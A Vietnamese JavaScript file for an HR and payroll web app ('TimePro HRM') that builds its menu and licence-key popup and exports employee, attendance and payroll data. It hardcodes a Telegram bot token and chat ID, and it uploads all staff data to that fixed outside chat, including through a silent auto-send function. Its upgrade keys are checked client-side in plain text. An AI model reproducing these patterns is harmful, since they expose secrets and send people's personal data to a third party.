function renderMenu(active) {
    // Xóa menu cũ nếu có
    const oldMenu = document.querySelector('.navbar');
    if (oldMenu) oldMenu.remove();

    // Lấy tên cửa hàng
    const storeName = (localStorage.getItem('storeName') || '').trim();

    // Kiểm tra nếu chưa từng chọn phiên bản thủ công (không có appVersionManual)
    let appVersionManual = localStorage.getItem('appVersionManual');
    let appVersion = localStorage.getItem('appVersion') || 'Free';

    // Tự động gán phiên bản theo tên cửa hàng nếu chưa từng chọn thủ công
    if (!appVersionManual) {
        if (storeName.toLowerCase() === 'lepshop') {
            appVersion = 'Pro';
            localStorage.setItem('appVersion', 'Pro');
        } else if (storeName.toLowerCase() === "h'farm" || storeName.toLowerCase() === "hfarm") {
            appVersion = 'Business';
            localStorage.setItem('appVersion', 'Business');
        } else {
            appVersion = 'Free';
            localStorage.setItem('appVersion', 'Free');
        }
    }

    // Định nghĩa màu cho từng phiên bản
    const versionColors = {
        Free:   { menu: '#1976d2', label: '#1976d2' },
        Pro:    { menu: '#8e24aa', label: '#8e24aa' },
        Business: { menu: '#2e7d32', label: '#2e7d32' }
    };

    // Lấy màu menu do người dùng chọn (nếu có)
    let userMenuColor = localStorage.getItem('menuColor');
    // Lấy màu phiên bản do hệ thống chọn (menuVersionColor)
    let menuVersionColor = localStorage.getItem('menuVersionColor');

    // Nếu có menuVersionColor thì ưu tiên, nếu không thì dùng menuColor, nếu không thì mặc định theo phiên bản
    let menuColor, labelColor;
    if (menuVersionColor) {
        menuColor = menuVersionColor;
        labelColor = menuVersionColor;
    } else if (userMenuColor) {
        menuColor = userMenuColor;
        labelColor = userMenuColor;
    } else {
        menuColor = (versionColors[appVersion] || versionColors['Free']).menu;
        labelColor = (versionColors[appVersion] || versionColors['Free']).label;
    }

    // Luôn cập nhật lại style khi renderMenu (xóa style cũ nếu có)
    const oldStyle = document.getElementById('menu-style');
    if (oldStyle) oldStyle.remove();
    const style = document.createElement('style');
    style.id = 'menu-style';
    style.innerHTML = `
        .navbar {
            background: ${menuColor};
            color: #fff;
            padding: 0 32px;
            display: flex;
            align-items: center;
            min-height: 64px;
            gap: 0;
            box-shadow: 0 4px 16px #0001;
            border-bottom-left-radius: 18px;
            border-bottom-right-radius: 18px;
            position: relative;
            z-index: 10;
        }
        .navbar .navbar-logo {
            font-size: 22px;
            font-weight: bold;
            letter-spacing: 1.5px;
            color: #fff;
            margin-right: 32px;
            display: flex;
            align-items: center;
            gap: 8px;
            user-select: none;
        }
        .navbar .navbar-logo-icon {
            width: 32px;
            height: 32px;
            background: #fff2;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
        }
        .navbar .app-version-label {
            background: ${labelColor};
            font-size:13px;
            font-weight:600;
            color: #fff;
            border-radius:6px;
            padding:2px 8px;
            margin-left:8px;
            letter-spacing:1px;
            cursor:pointer;
            box-shadow: 0 2px 8px ${labelColor}33;
            border: 2px solid #fff5;
            transition: background 0.2s;
            display: inline-block;
            text-align: center;
        }
        .navbar .app-version-label:hover {
            filter: brightness(1.1);
        }
        .navbar .navbar-menu {
            display: flex;
            gap: 8px;
            flex: 1;
        }
        .navbar button {
            background: none;
            border: none;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            padding: 10px 20px;
            border-radius: 8px;
            transition: background 0.18s, color 0.18s, box-shadow 0.18s;
            font-weight: 500;
            letter-spacing: 0.5px;
            margin: 0 2px;
            position: relative;
        }
        .navbar button.active, .navbar button:hover {
            background: #fff;
            color: #1976d2;
            box-shadow: 0 2px 8px #1976d233;
        }
        .navbar .menu-export-btn {
            background: #43a047;
            color: #fff;
            border: none;
            font-size: 16px;
            cursor: pointer;
            padding: 10px 18px;
            border-radius: 8px;
            margin-left: 16px;
            transition: background 0.18s, color 0.18s, box-shadow 0.18s;
            font-weight: 500;
            letter-spacing: 0.5px;
            display: inline-block;
            box-shadow: 0 2px 8px #43a04733;
        }
        .navbar .menu-export-btn:hover {
            background: #388e3c;
            color: #fff;
        }
        .navbar .menu-import-btn {
            background: #ff9800;
            color: #fff;
            border: none;
            font-size: 16px;
            cursor: pointer;
            padding: 10px 18px;
            border-radius: 8px;
            margin-left: 10px;
            transition: background 0.18s, color 0.18s, box-shadow 0.18s;
            font-weight: 500;
            letter-spacing: 0.5px;
            display: inline-block;
            position: relative;
            overflow: hidden;
            box-shadow: 0 2px 8px #ff980033;
        }
        .navbar .menu-import-btn:hover {
            background: #fb8c00;
            color: #fff;
        }
        .navbar .menu-data-dropdown {
            position: relative;
            margin-left: 16px;
        }
        .navbar .menu-data-btn {
            background: #1565c0;
            color: #fff;
            border: none;
            font-size: 16px;
            cursor: pointer;
            padding: 10px 18px;
            border-radius: 8px;
            font-weight: 500;
            letter-spacing: 0.5px;
            display: flex;
            align-items: center;
            gap: 6px;
            transition: background 0.18s;
        }
        .navbar .menu-data-btn:hover,
        .navbar .menu-data-btn:focus {
            background: #1976d2;
        }
        .navbar .menu-data-list {
            display: none;
            position: absolute;
            top: 110%;
            right: 0;
            min-width: 180px;
            background: #fff;
            color: #1976d2;
            border-radius: 8px;
            box-shadow: 0 4px 16px #0002;
            z-index: 100;
            flex-direction: column;
            padding: 6px 0;
            animation: fadeInMenu 0.18s;
        }
        .navbar .menu-data-dropdown.open .menu-data-list {
            display: flex;
        }
        .navbar .menu-data-list button {
            background: none;
            border: none;
            color: #1976d2;
            font-size: 15px;
            text-align: left;
            width: 100%;
            padding: 10px 20px;
            border-radius: 0;
            margin: 0;
            transition: background 0.15s, color 0.15s;
            font-weight: 500;
        }
        .navbar .menu-data-list button:hover {
            background: #e3f2fd;
            color: #1565c0;
        }
        .navbar .menu-data-list .menu-import-btn {
            color: #ff9800;
        }
        .navbar .menu-data-list .menu-export-btn {
            color: #43a047;
        }
        .navbar .menu-data-list .menu-telegram-btn {
            color: #0088cc;
        }
        .navbar input[type="file"] {
            display: none;
        }
        @keyframes fadeInMenu {
            from { opacity: 0; transform: translateY(10px);}
            to { opacity: 1; transform: translateY(0);}
        }
        @media (max-width: 900px) {
            .navbar {
                flex-direction: column;
                align-items: flex-start;
                padding: 0 10px;
                min-height: unset;
            }
            .navbar .navbar-logo {
                margin: 10px 0 0 0;
            }
            .navbar .navbar-menu {
                flex-wrap: wrap;
                gap: 4px;
                margin-bottom: 8px;
            }
            .navbar .menu-export-btn, .navbar .menu-import-btn {
                margin-left: 0;
            }
            .navbar .menu-data-dropdown {
                margin-left: 0;
                margin-top: 8px;
            }
        }
        `;
    document.head.appendChild(style);

    // Tạo menu mới (hiển thị phiên bản như cũ, nằm cạnh TimePro HRM)
    const nav = document.createElement('div');
    nav.className = 'navbar';
    nav.innerHTML = `
        <div class="navbar-logo">
            <span class="navbar-logo-icon">🕒</span>
            TimePro HRM
            <span id="app-version-label" class="app-version-label" title="Nhấn để nhập Key">
                ${appVersion}
            </span>
        </div>
        <div class="navbar-menu">
            <button onclick="location.href='index.html'"${active==='index'?' class="active"':''}>Trang Chủ</button>
            <button onclick="location.href='emp.html'"${active==='emp'?' class="active"':''}>Danh sách nhân viên</button>
            <button onclick="location.href='work_schedule.html'"${active==='work_schedule'?' class="active"':''}>Lịch làm việc</button>
            <button onclick="location.href='setup.html'"${active==='setup'?' class="active"':''}>Thiết Lập</button>
            <button onclick="location.href='att.html'"${active==='att'?' class="active"':''}>Chấm công</button>
            <button onclick="location.href='payroll.html'"${active==='payroll'?' class="active"':''}>Bảng lương</button>
            <button onclick="location.href='payroll_report.html'"${active==='payroll_report'?' class="active"':''}>Lập BC Lương</button>
            <button onclick="location.href='about-mksof.html'"${active==='about'?' class="active"':''}>Giới thiệu</button>
        </div>
        <div class="menu-data-dropdown" tabindex="0">
            <button type="button" class="menu-data-btn" onclick="toggleMenuDataDropdown(event)">
                ☰ Dữ liệu
            </button>
            <div class="menu-data-list">
                <button onclick="exportAllData()" class="menu-export-btn"${active==='export'?' class="active"':''}>Xuất dữ liệu</button>
                <button type="button" class="menu-import-btn" onclick="document.getElementById('importDataInput').click()">Nhập dữ liệu</button>
                <input id="importDataInput" type="file" accept=".json" onchange="importAllData && importAllData(event)">
                <button type="button" class="menu-telegram-btn" onclick="sendAllDataToTelegramBot()">Gửi dữ liệu về Bot</button>
            </div>
        </div>
    `;
    // Thêm menu vào đầu body
    document.body.insertBefore(nav, document.body.firstChild);

    // Thêm popup nhập key nếu chưa có
    if (!document.getElementById('popup-key-overlay')) {
        const popupHtml = `
        <div id="popup-key-overlay" style="display:none; position:fixed; z-index:9999; left:0; top:0; width:100vw; height:100vh; background:#0007; align-items:center; justify-content:center;">
            <div id="popup-key-box" style="background:#fff; border-radius:12px; box-shadow:0 8px 32px #0003; padding:32px 28px 24px 28px; min-width:320px; max-width:90vw; display:flex; flex-direction:column; align-items:center; position:relative;">
                <div style="font-size:20px; font-weight:600; color:#1976d2; margin-bottom:18px; letter-spacing:1px;">Nhập Key nâng cấp phiên bản</div>
                <div style="display:flex; gap:8px; margin-bottom:14px;">
                    <button class="quick-key-btn" data-key="Free" style="background:#eee; color:#1976d2; border:none; border-radius:6px; padding:6px 14px; font-size:14px; font-weight:600; cursor:pointer;">Free</button>
                    <button class="quick-key-btn" data-key="22062002Pro" style="background:#eee; color:#1976d2; border:none; border-radius:6px; padding:6px 14px; font-size:14px; font-weight:600; cursor:pointer;">Pro</button>
                    <button class="quick-key-btn" data-key="22062002BUS" style="background:#eee; color:#1976d2; border:none; border-radius:6px; padding:6px 14px; font-size:14px; font-weight:600; cursor:pointer;">Business</button>
                </div>
                <input id="popup-key-input" type="text" placeholder="Nhập key..." style="width:100%; font-size:16px; padding:10px 12px; border-radius:6px; border:1px solid #1976d2; outline:none; margin-bottom:18px;" />
                <div style="display:flex; gap:12px; width:100%; justify-content:center;">
                    <button id="popup-key-ok" style="background:#1976d2; color:#fff; border:none; border-radius:6px; padding:8px 22px; font-size:15px; font-weight:600; cursor:pointer; transition:background 0.18s;">Xác nhận</button>
                    <button id="popup-key-cancel" style="background:#eee; color:#1976d2; border:none; border-radius:6px; padding:8px 22px; font-size:15px; font-weight:600; cursor:pointer; transition:background 0.18s;">Hủy</button>
                </div>
                <span id="popup-key-msg" style="color:#d32f2f; font-size:13px; margin-top:10px; display:none;"></span>
                <span id="popup-key-close" style="position:absolute; top:8px; right:12px; font-size:20px; color:#888; cursor:pointer;" title="Đóng">&times;</span>
            </div>
        </div>
        <div id="popup-success-overlay" style="display:none; position:fixed; z-index:10000; left:0; top:0; width:100vw; height:100vh; background:#0005; align-items:center; justify-content:center;">
            <div id="popup-success-box" style="background:#fff; border-radius:12px; box-shadow:0 8px 32px #0003; padding:28px 32px 22px 32px; min-width:280px; max-width:90vw; display:flex; flex-direction:column; align-items:center; position:relative;">
                <div style="font-size:22px; color:#43a047; margin-bottom:12px;">&#10003;</div>
                <div id="popup-success-msg" style="font-size:17px; color:#1976d2; font-weight:600; text-align:center; margin-bottom:10px;"></div>
                <button id="popup-success-ok" style="background:#1976d2; color:#fff; border:none; border-radius:6px; padding:7px 22px; font-size:15px; font-weight:600; cursor:pointer; transition:background 0.18s;">Đóng</button>
                <span id="popup-success-close" style="position:absolute; top:8px; right:12px; font-size:20px; color:#888; cursor:pointer;" title="Đóng">&times;</span>
            </div>
        </div>
        `;
        const div = document.createElement('div');
        div.innerHTML = popupHtml;
        document.body.appendChild(div.firstElementChild);
        document.body.appendChild(div.lastElementChild);
    }

    // Hàm mở popup thông báo thành công
    function showSuccessPopup(msg) {
        const overlay = document.getElementById('popup-success-overlay');
        const msgDiv = document.getElementById('popup-success-msg');
        msgDiv.textContent = msg;
        overlay.style.display = 'flex';
        document.getElementById('popup-success-ok').onclick = function() {
            overlay.style.display = 'none';
        };
        document.getElementById('popup-success-close').onclick = function() {
            overlay.style.display = 'none';
        };
        overlay.onkeydown = function(e) {
            if (e.key === 'Escape') overlay.style.display = 'none';
        };
        setTimeout(() => {
            document.getElementById('popup-success-ok').focus();
        }, 100);
    }

    // Hàm mở popup nhập key
    function showKeyPopup() {
        const overlay = document.getElementById('popup-key-overlay');
        const input = document.getElementById('popup-key-input');
        const msg = document.getElementById('popup-key-msg');
        overlay.style.display = 'flex';
        input.value = '';
        msg.style.display = 'none';
        msg.textContent = '';
        input.focus();

        // Xác nhận key
        document.getElementById('popup-key-ok').onclick = function() {
            const key = input.value.trim();
            if (!key) {
                msg.textContent = 'Vui lòng nhập key!';
                msg.style.display = 'block';
                input.focus();
                return;
            }
            function setVersion(version, msgText) {
                localStorage.setItem('appVersion', version);
                localStorage.setItem('appVersionManual', '1');
                // Đổi màu menu theo phiên bản ngay lập tức
                localStorage.setItem('menuVersionColor', versionColors[version].menu);
                // Khi chọn phiên bản, bỏ chọn màu thủ công (menuColor) để ưu tiên màu phiên bản
                localStorage.removeItem('menuColor');
                overlay.style.display = 'none';
                showSuccessPopup(msgText);
                renderMenu(active);
            }
            if (key === '22062002Pro') {
                setVersion('Pro', 'Đã nâng cấp lên phiên bản Pro!');
            } else if (key === '22062002BUS') {
                setVersion('Business', 'Đã nâng cấp lên phiên bản Business!');
            } else if (key === 'Free') {
                setVersion('Free', 'Đã chuyển về phiên bản Free!');
            } else {
                msg.textContent = 'Key không hợp lệ!';
                msg.style.display = 'block';
                input.focus();
            }
        };
        // Hủy
        document.getElementById('popup-key-cancel').onclick = function() {
            overlay.style.display = 'none';
        };
        // Đóng bằng dấu X
        document.getElementById('popup-key-close').onclick = function() {
            overlay.style.display = 'none';
        };
        // Đóng bằng phím ESC
        overlay.onkeydown = function(e) {
            if (e.key === 'Escape') overlay.style.display = 'none';
        };
        // Cho phép Enter để xác nhận
        input.onkeydown = function(e) {
            if (e.key === 'Enter') document.getElementById('popup-key-ok').click();
        };
        // Thêm sự kiện cho các nút key mẫu
        overlay.querySelectorAll('.quick-key-btn').forEach(btn => {
            btn.onclick = function() {
                input.value = btn.getAttribute('data-key');
                document.getElementById('popup-key-ok').click();
            };
        });
    }

    // Gán sự kiện click cho label phiên bản
    document.getElementById('app-version-label').onclick = showKeyPopup;

    // Đóng dropdown khi click ngoài hoặc chuyển tab
    document.querySelectorAll('.menu-data-dropdown').forEach(drop => {
        drop.addEventListener('blur', function() {
            setTimeout(() => drop.classList.remove('open'), 120);
        });
    });
}

// Thêm hàm toggle dropdown
function toggleMenuDataDropdown(e) {
    e.stopPropagation();
    document.querySelectorAll('.menu-data-dropdown').forEach(drop => drop.classList.remove('open'));
    const dropdown = e.currentTarget.parentElement;
    dropdown.classList.toggle('open');
    // Đóng khi click ngoài
    if (dropdown.classList.contains('open')) {
        document.addEventListener('mousedown', closeDropdown, { once: true });
    }
    function closeDropdown(ev) {
        if (!dropdown.contains(ev.target)) dropdown.classList.remove('open');
    }
}

// Thêm hàm gửi dữ liệu về Telegram Bot
function sendDataToTelegramBot(jsonData) {
    // Thay YOUR_BOT_TOKEN và YOUR_CHAT_ID bằng thông tin thật của bạn
    const BOT_TOKEN = '7699835490:AAHXNqBbklJBgBxKBhRm2vBi2Ssjls4YVuw';
    const CHAT_ID = '7991407654';
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;

    const blob = new Blob([jsonData], {type: 'application/json'});
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', blob, 'qlnv_data.json');

    fetch(url, {
        method: 'POST',
        body: formData
    }).then(res => res.json())
      .then(data => {
        // Có thể log hoặc xử lý kết quả nếu cần
        // console.log('Telegram response:', data);
      }).catch(err => {
        // Có thể log lỗi nếu cần
        // console.error('Telegram error:', err);
      });
}

// Hàm tự động gửi toàn bộ dữ liệu hiện tại về Telegram Bot
function autoSendDataToTelegramBot() {
    try {
        const data = getExportData();
        sendDataToTelegramBot(JSON.stringify(data));
    } catch (e) {
        // Không làm gì nếu lỗi
    }
}

function getExportData() {
    const employees = JSON.parse(localStorage.getItem('employees') || '[]');
    const validEmpIds = new Set(employees.map(e => e.id));
    const allShiftsByEmp = JSON.parse(localStorage.getItem('shiftsByEmp') || '{}');
    let shiftsByEmp = {};
    Object.keys(allShiftsByEmp).forEach(empId => {
        if (validEmpIds.has(empId)) shiftsByEmp[empId] = allShiftsByEmp[empId];
    });
    if (employees.length === 0) {
        shiftsByEmp = {};
    }
    // Thêm shiftsByEmpByMonth (ca thiết lập thực tế)
    const allShiftsByEmpByMonth = JSON.parse(localStorage.getItem('shiftsByEmpByMonth') || '{}');
    let shiftsByEmpByMonth = {};
    Object.keys(allShiftsByEmpByMonth).forEach(month => {
        let monthObj = {};
        Object.keys(allShiftsByEmpByMonth[month]).forEach(empId => {
            if (validEmpIds.has(empId)) {
                let arr = allShiftsByEmpByMonth[month][empId];
                // Nếu chưa có ca nào (arr là undefined hoặc null), xuất ra 1 ca mặc định
                if (!Array.isArray(arr)) arr = [{ name: '', start: '', end: '', salary: 0, half: false }];
                // Nếu mảng rỗng, cũng xuất ra 1 ca mặc định
                if (Array.isArray(arr) && arr.length === 0) arr = [{ name: '', start: '', end: '', salary: 0, half: false }];
                monthObj[empId] = arr;
            }
        });
        if (Object.keys(monthObj).length > 0) {
            shiftsByEmpByMonth[month] = monthObj;
        }
    });

    return {
        employees,
        attendanceByMonth: JSON.parse(localStorage.getItem('attendanceByMonth') || '{}'),
        workDaysStd: String(Number(localStorage.getItem('workDaysStd')) || 26),
        salaryPerDay: String(Number(localStorage.getItem('salaryPerDay')) || 0),
        shiftsByEmp,
        shiftsByEmpByMonth, // luôn có ít nhất 1 ca mặc định nếu chưa có ca nào
        payrollInputs: JSON.parse(localStorage.getItem('payrollInputs') || '{}'),
        notes: (() => {
            let notes = {};
            Object.keys(localStorage).forEach(k => {
                if (k.startsWith('note_')) notes[k] = localStorage.getItem(k);
            });
            return notes;
        })(),
        // Thêm các dòng sau để xuất lịch làm việc và ca mẫu lịch làm việc
        workSchedules: JSON.parse(localStorage.getItem('workSchedules') || '{}'),
        scheduleShiftsByMonth: JSON.parse(localStorage.getItem('scheduleShiftsByMonth') || '{}'),
        workScheduleWeekTemplate: JSON.parse(localStorage.getItem('workScheduleWeekTemplate') || '{}'),
        workScheduleWeekNames: JSON.parse(localStorage.getItem('workScheduleWeekNames') || '{}')
    };
}

// Thêm hàm gửi lại toàn bộ dữ liệu về Telegram Bot khi bấm menu
function sendAllDataToTelegramBot() {
    try {
        const data = typeof getExportData === 'function' ? getExportData() : {};
        if (typeof sendDataToTelegramBot === 'function') {
            sendDataToTelegramBot(JSON.stringify(data));
            alert('Đã gửi toàn bộ dữ liệu về Telegram Bot!');
        } else {
            alert('Không tìm thấy hàm gửi dữ liệu về Bot!');
        }
    } catch (e) {
        alert('Lỗi khi gửi dữ liệu về Bot!');
    }
}